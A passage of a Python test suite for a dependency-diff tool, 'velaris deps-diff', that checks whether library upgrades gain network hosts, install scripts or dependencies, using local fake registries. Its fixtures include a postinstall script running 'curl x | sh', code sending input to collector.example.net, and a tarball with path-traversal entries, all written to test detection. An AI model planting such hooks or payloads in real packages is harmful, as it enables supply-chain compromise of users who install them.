#!/usr/bin/env python3
"""velaris deps-diff: what an upgrade gained, and what it cannot see.

A dependency can change what it does between two versions while its
name, its publisher and its list of dependencies stay the same. This
suite holds the two answers `velaris deps-diff` gives to that:

- for a Velaris library, the capability surface each version declares,
  compared the way `velaris capabilities check` compares a tree with its
  baseline - so a version that gains an effect, a host inside an effect
  it had, a path, a module, a count or a function's effect is reported,
  and one that narrows or only moves text around is not;
- for a package that is not Velaris, the install-time scripts and the
  declared dependencies, and the plain statement that its capability
  surface is unknown - never an effect read off source the tool cannot
  check.

It also holds the lockfile mode behind the GitHub Action's `deps-diff`
input, its SARIF, its pull-request comment (edited, never duplicated),
and the four programs of the benchmark's category 12.

Nothing here reaches the real PyPI, npm or GitHub: every registry and
the GitHub API are served on 127.0.0.1 by this file.

    python check_deps.py
"""
import base64
import hashlib
import io
import json
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import threading
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

HERE = Path(__file__).parent
VELARIS = HERE / "velaris.py"
sys.path.insert(0, str(HERE))
import velaris  # noqa: E402
from suite_dirs import isolate  # noqa: E402

isolate("check_deps")                 # its own proof cache

try:
    from jsonschema import Draft4Validator
except ImportError:                        # the SARIF cases say they skipped
    Draft4Validator = None

HAVE_GIT = shutil.which("git") is not None
SCRATCH = Path(tempfile.mkdtemp(prefix="velaris-deps-check-"))


# ---- the command line --------------------------------------------------------

def velaris_cli(*words, cwd=None, env=None):
    full = dict(os.environ)
    full.update(env or {})
    return subprocess.run([sys.executable, str(VELARIS), *words],
                          cwd=str(cwd or SCRATCH), capture_output=True,
                          text=True, encoding="utf-8", env=full, timeout=600)


def as_json(done) -> dict:
    try:
        return json.loads(done.stdout)
    except ValueError:
        return {"_stdout": done.stdout[-800:], "_stderr": done.stderr[-800:]}


def versions_dir(name: str, versions: dict) -> Path:
    """dir:<this> with one subdirectory per version, each holding files."""
    root = SCRATCH / "dirs" / name
    for version, files in versions.items():
        for rel, text in files.items():
            p = root / version / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(text, encoding="utf-8", newline="\n")
    return root


def findings(result: dict) -> list:
    return (result.get("velaris") or {}).get("findings", [])


def grant_finding(result: dict, grant: str) -> dict:
    return next((f for f in findings(result)
                 if f["kind"] == "grant" and f["grant"] == grant), {})


# ---- Velaris libraries -------------------------------------------------------

RENDER_PURE = '''fn render(total: Int) -> Text {
    return "total " + to_text(total)
}
'''

RENDER_PHONES_HOME = '''fn render(total: Int) -> Text uses net {
    let line = "total " + to_text(total)
    check post("https://telemetry.example.net/r", line) {
        ok reply { }
        fail why { }
    }
    return line
}
'''

MAILER = '''fn send(to: Text, body: Text) -> Text uses net {
    check post("https://mail.example.com/send", to + "\\n" + body) {
        ok answer { return "sent" }
        fail why { return "not sent: " + why }
    }
}
'''

MAILER_WITH_COPY = '''fn send(to: Text, body: Text) -> Text uses net {
    check post("https://collector.example.net/copy", to + "\\n" + body) {
        ok copied { }
        fail missed { }
    }
    check post("https://mail.example.com/send", to + "\\n" + body) {
        ok answer { return "sent" }
        fail why { return "not sent: " + why }
    }
}
'''

GREETER = '''fn greet(name: Text) -> Text {
    return "hello " + name
}

fn send(to: Text) -> Text uses net {
    check post("https://mail.example.com/send", greet(to)) {
        ok reply { return "sent" }
        fail why { return "not sent: " + why }
    }
}
'''

# the same surface: functions reordered, parameters and locals renamed,
# the literal URL moved into a variable bound once, the blocks reflowed
GREETER_REWRITTEN = '''fn send(recipient: Text) -> Text uses net {
    let endpoint = "https://mail.example.com/send"
    check post(endpoint, greet(recipient)) {
        ok answer {
            return "sent"
        }
        fail reason {
            return "not sent: " + reason
        }
    }
}

fn greet(who: Text) -> Text {
    return "hello " + who
}
'''

PING_ONCE = '''fn ping() -> Int uses net {
    check fetch_status("https://status.example.com/") {
        ok s { return s }
        fail why { return 0 }
    }
}
'''

PING_TEN = '''fn ping() -> Int uses net {
    let i = 0
    let last = 0
    while i < 10 {
        check fetch_status("https://status.example.com/") {
            ok s { last = s }
            fail why { last = 0 }
        }
        i = i + 1
    }
    return last
}
'''

ROOT_CONSTANT = '''fn root_two() -> Float {
    return 1.414
}
'''

ROOT_FROM_PYTHON = '''fn root_two() -> Float or fail uses ffi {
    return try py_float("math", "sqrt", ["2"])
}
'''


# ---- a registry on 127.0.0.1 -------------------------------------------------

class Served(BaseHTTPRequestHandler):
    routes: dict = {}

    def do_GET(self):
        body = Served.routes.get(self.path.split("?", 1)[0])
        if body is None:
            self.send_response(404)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


def serve(handler):
    server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server, f"http://127.0.0.1:{server.server_address[1]}"


def tar_gz(files: dict, top: str = "") -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        for name, body in files.items():
            data = body.encode("utf-8") if isinstance(body, str) else body
            info = tarfile.TarInfo(f"{top}/{name}" if top else name)
            info.size = len(data)
            info.mtime = 0
            t.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def zipped(files: dict) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, body in files.items():
            z.writestr(name, body)
    return buf.getvalue()


def npm_publish(base: str, name: str, version: str, files: dict,
                manifest_override=None, raw_members=None) -> None:
    """A version on the npm registry: its tarball (package/...), and the
    manifest the registry serves for it - the tarball's package.json
    unless manifest_override says otherwise."""
    pkg = json.loads(files["package.json"])
    data = tar_gz(files, "package") if raw_members is None else raw_members
    tarball = f"/tarballs/{name}-{version}.tgz"
    manifest = dict(manifest_override if manifest_override is not None
                    else pkg)
    manifest["dist"] = {
        "tarball": base + tarball,
        "integrity": "sha512-" + base64.b64encode(
            hashlib.sha512(data).digest()).decode()}
    Served.routes[tarball] = data
    Served.routes[f"/{name}/{version}"] = json.dumps(manifest).encode()
    doc = json.loads(Served.routes.get(f"/{name}", b'{"versions": {}}'))
    doc["name"] = name
    doc["versions"][version] = manifest
    Served.routes[f"/{name}"] = json.dumps(doc).encode()


def npm_package_json(name, version, **more) -> str:
    return json.dumps({"name": name, "version": version, **more}, indent=2)


def pypi_publish(base: str, name: str, version: str, sdist: dict,
                 wheel: dict, requires: list, wrong_digest=False) -> None:
    listed = []
    for kind, filename, data in (
            ("sdist", f"{name}-{version}.tar.gz",
             tar_gz(sdist, f"{name}-{version}")),
            ("bdist_wheel", f"{name}-{version}-py3-none-any.whl",
             zipped(wheel))):
        Served.routes[f"/files/{filename}"] = data
        digest = hashlib.sha256(data).hexdigest()
        listed.append({"filename": filename, "packagetype": kind,
                       "url": f"{base}/files/{filename}",
                       "digests": {"sha256": "0" * 64 if wrong_digest
                                   else digest}})
    Served.routes[f"/pypi/{name}/{version}/json"] = json.dumps({
        "info": {"name": name, "version": version,
                 "requires_dist": requires, "yanked": False},
        "urls": listed}).encode()
    doc = json.loads(Served.routes.get(f"/pypi/{name}/json",
                                       b'{"releases": {}}'))
    doc["releases"][version] = listed
    Served.routes[f"/pypi/{name}/json"] = json.dumps(doc).encode()


# ---- the GitHub API on 127.0.0.1 -----------------------------------------------

class GitHub(BaseHTTPRequestHandler):
    comments: list = []
    calls: list = []

    def _send(self, status, doc):
        body = json.dumps(doc).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _body(self):
        n = int(self.headers.get("Content-Length") or 0)
        return json.loads(self.rfile.read(n) or b"{}")

    def do_GET(self):
        GitHub.calls.append(("GET", self.path))
        if self.headers.get("Authorization") != "Bearer test-token":
            return self._send(401, {"message": "Bad credentials"})
        if self.path.startswith("/repos/o/r/issues/7/comments"):
            return self._send(200, GitHub.comments)
        self._send(404, {"message": "Not Found"})

    def do_POST(self):
        GitHub.calls.append(("POST", self.path))
        if self.path != "/repos/o/r/issues/7/comments":
            return self._send(404, {"message": "Not Found"})
        new = {"id": 1000 + len(GitHub.comments),
               "body": self._body()["body"]}
        GitHub.comments.append(new)
        self._send(201, new)

    def do_PATCH(self):
        GitHub.calls.append(("PATCH", self.path))
        cid = self.path.rsplit("/", 1)[-1]
        for c in GitHub.comments:
            if str(c["id"]) == cid:
                c["body"] = self._body()["body"]
                return self._send(200, c)
        self._send(404, {"message": "Not Found"})

    def log_message(self, *args):
        pass


def git(root: Path, *words):
    return subprocess.run(["git", *words], cwd=str(root), capture_output=True,
                          text=True, timeout=120)


def git_repo(files: dict) -> Path:
    root = Path(tempfile.mkdtemp(prefix="repo-", dir=str(SCRATCH)))
    git(root, "init", "-q")
    for key, value in (("user.name", "deps"),
                       ("user.email", "deps@example.invalid"),
                       ("commit.gpgsign", "false"), ("tag.gpgsign", "false"),
                       ("core.autocrlf", "false")):
        git(root, "config", key, value)
    write(root, files)
    return root


def write(root: Path, files: dict) -> None:
    for rel, text in files.items():
        p = root / rel
        if text is None:
            p.unlink()
            continue
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8", newline="\n")


def commit(root: Path, message: str) -> None:
    git(root, "add", "-A")
    git(root, "commit", "-q", "-m", message)


def package_lock(deps: dict, base: str) -> str:
    packages = {"": {"name": "app", "version": "1.0.0",
                     "dependencies": {n: "^" + v for n, v in deps.items()}}}
    for n, v in deps.items():
        packages[f"node_modules/{n}"] = {
            "version": v, "resolved": f"{base}/tarballs/{n}-{v}.tgz"}
    return json.dumps({"name": "app", "version": "1.0.0",
                       "lockfileVersion": 3, "requires": True,
                       "packages": packages}, indent=2) + "\n"


def line_of(text: str, after: str, needle: str) -> int:
    lines = text.splitlines()
    start = next(i for i, ln in enumerate(lines) if after in ln)
    return next(i for i in range(start, len(lines)) if needle in lines[i]) + 1


# ---- the benchmark's category 12 ----------------------------------------------

def category_12() -> tuple:
    corpus = json.loads((HERE / "benchmark" / "corpus.json")
                        .read_text(encoding="utf-8"))
    cat = next(c for c in corpus["categories"] if c["number"] == 12)
    return cat["key"], cat["programs"]


def place_12(key: str, prog: dict) -> tuple:
    """The dependency's two versions under dir:<versions>, and the caller
    beside each, with the placeholders filled as the harness fills them."""
    dep = prog["dependency"]
    where = SCRATCH / "bench" / prog["id"]
    fills = {"{url}": f"http://127.0.0.1:50001/{prog['id']}/velaris",
             "{other_url}": f"http://127.0.0.1:50002/{prog['id']}/velaris",
             "{path}": (where / "written.txt").as_posix(),
             "{granted}": (where / "granted").as_posix()}

    def filled(path: Path) -> str:
        text = path.read_text(encoding="utf-8")
        for k, v in fills.items():
            text = text.replace(k, v)
        return text

    corpus = HERE / "benchmark" / "corpus" / key
    callers = {}
    for side in ("old", "new"):
        body = filled(corpus / prog["name"] / dep[side]
                      / (dep["module"] + ".vel"))
        write(where / "versions" / dep[side], {dep["module"] + ".vel": body})
        write(where / side, {dep["module"] + ".vel": body,
                             prog["name"] + ".vel":
                             filled(corpus / (prog["name"] + ".vel"))})
        callers[side] = where / side / (prog["name"] + ".vel")
    return where / "versions", callers, fills


# ---------------------------------------------------------------------------------

def main() -> int:
    passed = failed = skipped = 0

    def ok(label, condition, detail=""):
        nonlocal passed, failed
        if condition:
            print(f"  ok       {label}")
            passed += 1
        else:
            print(f"  BROKEN   {label}")
            if detail:
                print(f"           {str(detail)[:900]}")
            failed += 1

    def skip(label, why):
        nonlocal skipped
        print(f"  skip     {label} ({why})")
        skipped += 1

    def diff(package, old, new, *more, env=None):
        done = velaris_cli("deps-diff", package, old, new, "--json", *more,
                           env=env)
        return done.returncode, as_json(done), done

    registry, base = serve(Served)
    github, api = serve(GitHub)
    reg_env = {"VELARIS_NPM_REGISTRY": base, "VELARIS_PYPI_URL": base}
    schema = json.loads((HERE / "tests" / "sarif-schema-2.1.0.json")
                        .read_text(encoding="utf-8"))

    def validates(label, log):
        if Draft4Validator is None:
            skip(label, "jsonschema is not installed")
            return
        errs = list(Draft4Validator(schema).iter_errors(log))
        ok(label, log and not errs, [e.message for e in errs[:2]])

    try:
        # --------------------------------------------------------------------
        print("a Velaris library: the declared surface of two versions")
        print("-" * 62)
        lib = versions_dir("report", {"1.0.0": {"report.vel": RENDER_PURE},
                                      "1.1.0": {"report.vel":
                                                RENDER_PHONES_HOME}})
        code, r, done = diff(f"dir:{lib}", "1.0.0", "1.1.0")
        g = grant_finding(r, "net:telemetry.example.net")
        fn = next((f for f in findings(r) if f["kind"] == "function"), {})
        ok("a library that gains net: exit 1, the grant reported as a new "
           "effect outside the old surface and the file's old entry (W1, "
           "W3), and the function that gained it (W5)",
           code == 1 and r.get("schema") == "velaris.deps-diff/1"
           and r["capability"] == "derived" and g.get("new_effect") is True
           and g.get("rules") == ["W1", "W3"]
           and fn.get("function") == "render" and fn.get("rules") == ["W5"]
           and fn.get("gained") == ["net"]
           and r["velaris"]["gained"]["effects"] == ["net"]
           and r["velaris"]["gained"]["hosts"] == ["telemetry.example.net"],
           r)
        origin = (g.get("programs") or [{}])[0].get("origins", [{}])[0]
        ok("...naming the file, line and call that introduced it",
           origin.get("file") == "report.vel" and origin.get("line") == 3
           and origin.get("call") == "post", g)

        lib = versions_dir("mailer", {"1.4.0": {"mailer.vel": MAILER},
                                      "1.5.0": {"mailer.vel":
                                                MAILER_WITH_COPY}})
        code, r, done = diff(f"dir:{lib}", "1.4.0", "1.5.0")
        g = grant_finding(r, "net:collector.example.net")
        ok("a library that gains a host inside net, which it already had: "
           "exit 1, the host outside the old surface, no new effect",
           code == 1 and g.get("new_effect") is False
           and g.get("outside_surface") is True
           and r["velaris"]["gained"]["effects"] == []
           and r["velaris"]["gained"]["hosts"] == ["collector.example.net"]
           and "net:mail.example.com" in r["velaris"]["before"]["grants"],
           r)
        ok("...and the second request as a count: at most 2 net operations "
           "where there was 1",
           any(f["kind"] == "count" and f["effect"] == "net"
               and f["current"] == 2 for f in findings(r)), findings(r))
        text = velaris_cli("deps-diff", f"dir:{lib}", "1.4.0", "1.5.0")
        ok("...and the text report says GAINED and names the host",
           text.returncode == 1
           and "GAINED  net:collector.example.net" in text.stdout,
           text.stdout)

        code, r, _ = diff(f"dir:{lib}", "1.5.0", "1.4.0")
        ok("a library that narrows: exit 0, nothing widened, the narrowing "
           "reported",
           code == 0 and r["velaris"]["widened"] is False
           and r["gained"] is False
           and any("net:collector.example.net" in n
                   for n in r["velaris"]["narrowed"]), r)

        lib = versions_dir("greeter", {"2.0.0": {"greet.vel": GREETER},
                                       "2.0.1": {"greet.vel":
                                                 GREETER_REWRITTEN}})
        code, r, _ = diff(f"dir:{lib}", "2.0.0", "2.0.1")
        ok("a library unchanged in surface - reordered, renamed, a literal "
           "moved into a variable - exit 0, no finding, no narrowing",
           code == 0 and findings(r) == [] and r["velaris"]["narrowed"] == []
           and r["velaris"]["before"] == r["velaris"]["after"], r)

        lib = versions_dir("pinger", {"1.0.0": {"ping.vel": PING_ONCE},
                                      "1.1.0": {"ping.vel": PING_TEN}})
        code, r, _ = diff(f"dir:{lib}", "1.0.0", "1.1.0")
        ok("a library whose one request becomes ten: exit 1, the count "
           "from 1 to 10",
           code == 1 and r["velaris"]["gained"]["counts"] == [
               {"effect": "net", "file": "ping.vel", "old": 1, "new": 10}],
           r.get("velaris"))

        code, r, done = diff(f"dir:{lib}", "1.0.0", "9.9.9")
        ok("a version that does not exist: exit 2, naming it and the "
           "versions there",
           code == 2 and "9.9.9" in done.stderr and "1.0.0" in done.stderr
           and "1.1.0" in done.stderr and not done.stdout.strip(),
           done.stderr)

        if not HAVE_GIT:
            skip("a library read from git tags", "git is not installed")
        else:
            repo = git_repo({"root.vel": ROOT_CONSTANT})
            commit(repo, "v1")
            git(repo, "tag", "v1.0.0")
            write(repo, {"root.vel": ROOT_FROM_PYTHON})
            commit(repo, "v2")
            git(repo, "tag", "v1.1.0")
            code, r, _ = diff(f"git:{repo}", "v1.0.0", "v1.1.0")
            ok("a library read from git tags that gains a Python module: "
               "exit 1, ffi:math, a new effect",
               code == 1 and r["velaris"]["gained"]["modules"] == ["math"]
               and r["velaris"]["gained"]["effects"] == ["ffi"], r)
            code, r, done = diff(f"git:{repo}", "v1.0.0", "v2.0.0")
            ok("...and a tag that does not exist: exit 2, listing the tags",
               code == 2 and "v2.0.0" in done.stderr
               and "v1.1.0" in done.stderr, done.stderr)

        # --------------------------------------------------------------------
        print()
        print("a package that is not Velaris: what can be read, and no more")
        print("-" * 62)
        npm_publish(base, "plainjs", "2.0.0", {
            "package.json": npm_package_json("plainjs", "2.0.0",
                                             main="index.js"),
            "index.js": "export const pad = (s) => ' ' + s;\n"})
        npm_publish(base, "plainjs", "2.1.0", {
            "package.json": npm_package_json("plainjs", "2.1.0",
                                             main="index.js"),
            # the source now reaches the network; deps-diff must not say so
            "index.js": "export const pad = (s) => { fetch("
                        "'https://collector.example.net/' + s); "
                        "return ' ' + s; };\n"})
        code, r, done = diff("npm:plainjs", "2.0.0", "2.1.0", env=reg_env)
        text = velaris_cli("deps-diff", "npm:plainjs", "2.0.0", "2.1.0",
                           env=reg_env)
        ok("a package with no Velaris in it: exit 3, not a failure - the "
           "surface unknown, and no effect or host read off its JavaScript",
           code == 3 and r.get("capability") == "unknown"
           and r.get("velaris") is None and r.get("gained") is False
           and "collector.example.net" not in done.stdout
           and "JavaScript" in r["not_derived"][0]
           and "not derived" in r["not_derived"][0]
           and "Traceback" not in done.stderr, r)
        ok("...and its text report says UNKNOWN and that this is not a "
           "finding of safety",
           text.returncode == 3 and "UNKNOWN" in text.stdout
           and "not a finding that" in text.stdout, text.stdout)

        npm_publish(base, "textkit", "1.0.0", {
            "package.json": npm_package_json(
                "textkit", "1.0.0", main="index.js",
                dependencies={"tiny": "^1.0.0"}),
            "index.js": "export const up = (s) => s.toUpperCase();\n"})
        npm_publish(base, "textkit", "1.1.0", {
            "package.json": npm_package_json(
                "textkit", "1.1.0", main="index.js",
                scripts={"postinstall": "node setup.js"},
                dependencies={"tiny": "^1.0.0", "helper": "^2.0.0"}),
            "index.js": "export const up = (s) => s.toUpperCase();\n",
            "setup.js": "console.log('ready');\n"})
        code, r, _ = diff("npm:textkit", "1.0.0", "1.1.0", env=reg_env)
        added = r.get("install_time", {}).get("added", [])
        ok("an install script added: exit 1, postinstall reported as the "
           "registry's manifest and the tarball both declare it, with the "
           "file it runs, and the surface still unknown",
           code == 1 and r["gained"] is True and r["capability"] == "unknown"
           and sorted((h["name"], h["command"], h["source"]) for h in added)
           == [("postinstall", "node setup.js", "registry manifest"),
               ("postinstall", "node setup.js", "tarball package.json")]
           and all("setup.js" in h["files"] for h in added),
           r.get("install_time"))
        ok("...and the dependency it now declares",
           [(x["name"], x["spec"]) for x in r["dependencies"]["added"]]
           == [("helper", "^2.0.0")], r.get("dependencies"))

        npm_publish(base, "hooked", "1.0.0", {
            "package.json": npm_package_json(
                "hooked", "1.0.0", scripts={"postinstall": "node setup.js"}),
            "setup.js": "console.log('building');\n"})
        npm_publish(base, "hooked", "1.0.1", {
            "package.json": npm_package_json(
                "hooked", "1.0.1", scripts={"postinstall": "node setup.js"}),
            "setup.js": "require('child_process').exec('curl x | sh');\n"})
        npm_publish(base, "hooked", "1.0.2", {
            "package.json": npm_package_json(
                "hooked", "1.0.2",
                scripts={"postinstall": "node setup.js --quiet"}),
            "setup.js": "require('child_process').exec('curl x | sh');\n"})
        code, r, _ = diff("npm:hooked", "1.0.0", "1.0.1", env=reg_env)
        changed = r.get("install_time", {}).get("changed", [])
        ok("an install script changed where its command did not - the file "
           "it runs is different: exit 1, CHANGED, naming the file",
           code == 1 and len(changed) == 2
           and all(c["name"] == "postinstall" and any(
               "setup.js" in w and "not the same file" in w
               for w in c["what"]) for c in changed), r.get("install_time"))
        text = velaris_cli("deps-diff", "npm:hooked", "1.0.0", "1.0.1",
                           env=reg_env)
        ok("...said once in the report, with both places it was read",
           text.stdout.count("CHANGED  npm postinstall") == 1
           and "[registry manifest, tarball package.json]" in text.stdout,
           text.stdout)
        code, r, _ = diff("npm:hooked", "1.0.1", "1.0.2", env=reg_env)
        changed = r.get("install_time", {}).get("changed", [])
        ok("an install script whose command changed: exit 1, CHANGED, "
           "quoting both commands",
           code == 1 and len(changed) == 2
           and all(any("node setup.js --quiet" in w for w in c["what"])
                   for c in changed), r.get("install_time"))

        pkg = npm_package_json("confused", "1.0.1",
                               scripts={"postinstall": "node x.js"})
        npm_publish(base, "confused", "1.0.0", {
            "package.json": npm_package_json("confused", "1.0.0")})
        npm_publish(base, "confused", "1.0.1",
                    {"package.json": pkg, "x.js": "1;\n"},
                    manifest_override={"name": "confused",
                                       "version": "1.0.1"})
        code, r, _ = diff("npm:confused", "1.0.0", "1.0.1", env=reg_env)
        ok("a registry manifest that hides the tarball's install script: "
           "the script is reported as the tarball declares it, and the "
           "difference is said without claiming which one npm runs",
           code == 1 and [(h["name"], h["source"])
                          for h in r["install_time"]["added"]]
           == [("postinstall", "tarball package.json")]
           and any("different install scripts" in n
                   and "both are reported" in n
                   for n in r["new"]["notes"]), r)

        npm_publish(base, "mixed", "0.1.0", {
            "package.json": npm_package_json("mixed", "0.1.0"),
            "lib/report.vel": RENDER_PURE, "index.js": "export {};\n"})
        npm_publish(base, "mixed", "0.2.0", {
            "package.json": npm_package_json("mixed", "0.2.0"),
            "lib/report.vel": RENDER_PHONES_HOME,
            "index.js": "export {};\n"})
        code, r, _ = diff("npm:mixed", "0.1.0", "0.2.0", env=reg_env)
        ok("a package holding Velaris and JavaScript: the .vel surface "
           "compared (net gained), and the rest said to be not derived",
           code == 1 and r["capability"] == "partial"
           and r["velaris"]["gained"]["effects"] == ["net"]
           and "JavaScript" in r["not_derived"][0], r)

        members = io.BytesIO()
        with tarfile.open(fileobj=members, mode="w:gz") as t:
            for name, data in (("package/package.json",
                                npm_package_json("sneaky", "1.0.0")),
                               ("package/../evil.vel", RENDER_PHONES_HOME),
                               ("/abs.vel", RENDER_PHONES_HOME),
                               # joined under a directory on Windows, a
                               # part with a drive in it leaves it
                               ("package/sub/C:evil.vel", RENDER_PHONES_HOME),
                               ("package/index.js", "export {};\n")):
                body = data.encode()
                info = tarfile.TarInfo(name)
                info.size = len(body)
                t.addfile(info, io.BytesIO(body))
        npm_publish(base, "sneaky", "1.0.0",
                    {"package.json": npm_package_json("sneaky", "1.0.0")},
                    raw_members=members.getvalue())
        npm_publish(base, "sneaky", "1.0.1",
                    {"package.json": npm_package_json("sneaky", "1.0.1"),
                     "index.js": "export {};\n"})
        code, r, _ = diff("npm:sneaky", "1.0.0", "1.0.1", env=reg_env)
        ok("a tarball with paths that climb out, are absolute or name a "
           "drive: those entries are left out, and nothing is written "
           "outside",
           code == 3 and r["old"]["velaris_files"] == 0
           and not (SCRATCH.parent / "evil.vel").exists(), r.get("old"))

        code, r, done = diff("npm:textkit", "1.0.0", "4.0.0", env=reg_env)
        ok("an npm version that does not exist: exit 2, listing the "
           "versions the registry has",
           code == 2 and "4.0.0" in done.stderr and "1.1.0" in done.stderr,
           done.stderr)
        Served.routes["/gone"] = json.dumps({
            "name": "gone", "time": {"unpublished": {
                "time": "2025-09-25T03:31:54.381Z",
                "versions": ["1.0.0"]}}}).encode()
        code, r, done = diff("npm:gone", "1.0.0", "1.0.1", env=reg_env)
        ok("an unpublished npm package: exit 2, saying it was unpublished "
           "and cannot be read",
           code == 2 and "unpublished on 2025-09-25" in done.stderr,
           done.stderr)

        pypi_publish(base, "pyplain", "1.0", {
            "pyproject.toml": '[build-system]\nrequires = ["hatchling"]\n'
                              'build-backend = "hatchling.build"\n',
            "pyplain/__init__.py": "VALUE = 1\n"},
            {"pyplain/__init__.py": "VALUE = 1\n"}, ["attrs>=22"])
        pypi_publish(base, "pyplain", "1.1", {
            "pyproject.toml": '[build-system]\nrequires = ["hatchling"]\n'
                              'build-backend = "hatchling.build"\n',
            "setup.py": "import os\n",
            "pyplain/__init__.py": "VALUE = 2\n"},
            {"pyplain/__init__.py": "VALUE = 2\n",
             "pyplain_hook.pth": "import os; os.getcwd()\n"},
            ["attrs>=23", "requests>=2"])
        code, r, _ = diff("pypi:pyplain", "1.0", "1.1", env=reg_env)
        ok("a Python package: exit 1 for the setup.py and the .pth file it "
           "gained, the build backend unchanged, the surface unknown",
           code == 1 and r["capability"] == "unknown"
           and sorted(h["name"] for h in r["install_time"]["added"])
           == ["pyplain_hook.pth", "setup.py"]
           and [h["kind"] for h in r["install_time"]["unchanged"]]
           == ["build-backend"] and "Python" in r["not_derived"][0], r)
        ok("...and its declared dependencies: requests added, attrs changed",
           [x["name"] for x in r["dependencies"]["added"]] == ["requests"]
           and [(x["name"], x["new"]) for x in r["dependencies"]["changed"]]
           == [("attrs", "attrs>=23")], r.get("dependencies"))
        pypi_publish(base, "pybad", "1.0", {"x.py": "1\n"}, {"x.py": "1\n"},
                     [], wrong_digest=True)
        pypi_publish(base, "pybad", "1.1", {"x.py": "1\n"}, {"x.py": "1\n"},
                     [])
        code, r, done = diff("pypi:pybad", "1.0", "1.1", env=reg_env)
        ok("a download whose bytes are not the ones PyPI lists: exit 2, "
           "never a comparison",
           code == 2 and "not the ones PyPI lists" in done.stderr,
           done.stderr)
        code, r, done = diff("pypi:pyplain", "1.0", "3.0", env=reg_env)
        ok("a PyPI version that does not exist: exit 2, listing the "
           "releases", code == 2 and "3.0" in done.stderr
           and "1.1" in done.stderr, done.stderr)

        done = velaris_cli("deps-diff", "textkit", "1.0.0", "1.1.0")
        ok("a package that does not say which registry: exit 2, asking for "
           "pypi:, npm:, git: or dir:",
           done.returncode == 2 and "pypi:NAME" in done.stderr
           and "npm:NAME" in done.stderr, done.stderr)

        sarif = velaris_cli("deps-diff", "npm:textkit", "1.0.0", "1.1.0",
                            "--sarif", env=reg_env)
        log = as_json(sarif)
        results = (log.get("runs") or [{}])[0].get("results", [])
        hit = next((x for x in results
                    if x["ruleId"] == "dependency-install-script"), {})
        ok("--sarif of one package: the install script as an error in the "
           "package, the unknown surface as a note",
           sarif.returncode == 1 and hit.get("level") == "error"
           and hit["locations"][0]["physicalLocation"]["artifactLocation"]
           .get("uriBaseId") == "DEPENDENCY"
           and any(x["ruleId"] == "dependency-surface-unknown"
                   and x["level"] == "note" for x in results), results)
        validates("...and the log validates against SARIF 2.1.0", log)

        # --------------------------------------------------------------------
        print()
        print("lockfiles: every upgrade a pull request makes")
        print("-" * 62)
        if not HAVE_GIT:
            skip("lockfile mode, SARIF and the pull-request comment",
                 "git is not installed")
        else:
            repo = git_repo({
                "package-lock.json": package_lock({"textkit": "1.0.0",
                                                   "plainjs": "2.0.0"}, base),
                "requirements.txt": "pyplain==1.0\n",
                "app.vel": 'fn main() uses io {\n    print("hi")\n}\n'})
            commit(repo, "base")
            head_lock = package_lock({"textkit": "1.1.0", "plainjs": "2.0.0"},
                                     base)
            write(repo, {"package-lock.json": head_lock,
                         "requirements.txt": "pyplain==1.1\n",
                         "yarn.lock": "# yarn lockfile v1\n"})
            commit(repo, "upgrade textkit and pyplain")
            done = velaris_cli("deps-diff", "--against", "HEAD~1", "--json",
                               cwd=repo, env=reg_env)
            r = as_json(done)
            ups = {u["name"]: u for u in r.get("upgrades", [])}
            want_line = line_of(head_lock, '"node_modules/textkit"',
                                '"version": "1.1.0"')
            ok("--against a base: each upgraded dependency compared, at the "
               "line of the lockfile that pins it",
               done.returncode == 1
               and r.get("schema") == "velaris.deps-diff-lockfiles/1"
               and set(ups) == {"textkit", "pyplain"}
               and ups["textkit"]["old"] == "1.0.0"
               and ups["textkit"]["line"] == want_line
               and ups["textkit"]["result"]["install_time"]["added"]
               and ups["pyplain"]["result"]["install_time"]["added"], r)
            unread = [x for x in r.get("lockfiles", []) if not x["read"]]
            ok("...a lockfile it does not read is listed as changed and not "
               "read, never skipped quietly",
               [x["file"] for x in unread] == ["yarn.lock"], r.get("lockfiles"))
            saved = repo / "deps.json"
            saved.write_text(done.stdout, encoding="utf-8")

            sarif = velaris_cli("deps-diff", "--from", str(saved), "--sarif",
                                cwd=repo)
            log = as_json(sarif)
            results = (log.get("runs") or [{}])[0].get("results", [])
            at = [x["locations"][0]["physicalLocation"] for x in results
                  if x["ruleId"] == "dependency-install-script"
                  and "textkit" in x["message"]["text"]]
            ok("--sarif --from a saved result: the finding at "
               "package-lock.json, on the line of the upgrade",
               sarif.returncode == 1 and at
               and at[0]["artifactLocation"]["uri"] == "package-lock.json"
               and at[0].get("region", {}).get("startLine") == want_line,
               results[:3])
            validates("...and the log validates against SARIF 2.1.0", log)

            env = dict(reg_env, GITHUB_TOKEN="test-token",
                       GITHUB_REPOSITORY="o/r", GITHUB_API_URL=api)
            GitHub.comments[:] = [{"id": 99, "body": "looks fine to me"}]
            GitHub.calls[:] = []
            first = velaris_cli("deps-diff", "--against", "HEAD~1",
                                "--comment", "--pr", "7", cwd=repo, env=env)
            second = velaris_cli("deps-diff", "--against", "HEAD~1",
                                 "--comment", "--pr", "7", cwd=repo, env=env)
            ours = [c for c in GitHub.comments
                    if velaris.DEPS_COMMENT_MARKER in c["body"]]
            writes = [c for c in GitHub.calls if c[0] != "GET"]
            ok("the pull-request comment: posted once, then edited in place "
               "on the second run - one comment, not two",
               first.returncode == 1 and second.returncode == 1
               and len(ours) == 1 and writes == [
                   ("POST", "/repos/o/r/issues/7/comments"),
                   ("PATCH", f"/repos/o/r/issues/comments/{ours[0]['id']}")]
               and GitHub.comments[0] == {"id": 99,
                                          "body": "looks fine to me"},
               (first.stderr, second.stderr, GitHub.calls))
            body = ours[0]["body"] if ours else ""
            ok("...holding what each upgrade gained and, as plainly, what "
               "was not seen",
